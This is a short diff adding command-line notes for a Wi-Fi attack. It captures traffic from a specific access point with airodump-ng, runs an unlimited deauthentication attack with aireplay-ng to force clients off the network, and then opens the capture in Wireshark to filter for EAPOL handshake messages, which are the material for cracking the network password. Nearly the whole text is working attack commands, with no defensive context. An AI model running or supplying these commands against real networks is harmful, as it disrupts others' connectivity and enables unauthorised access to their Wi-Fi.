@@ -24,3 +24,13 @@ Channel used by AP for SSID: 2
 
 !1st Window:
 !Make sure you replace the channel number and bssid with your own
+!Replace hack1 with your file name like capture1 or something
+sudo airodump-ng -w hack1 -c 2 --bssid 90:9A:4A:B8:F3:FB wlan0mon
+
+!2nd Window - deauth attack
+!Make sure you replace the bssid with your own
+sudo aireplay-ng --deauth 0 -a 90:9A:4A:B8:F3:FB wlan0mon
+
+!Use Wireshark to open hack file
+wireshark hack1-01.cap
+!Filter Wireshark messages for EAPOL
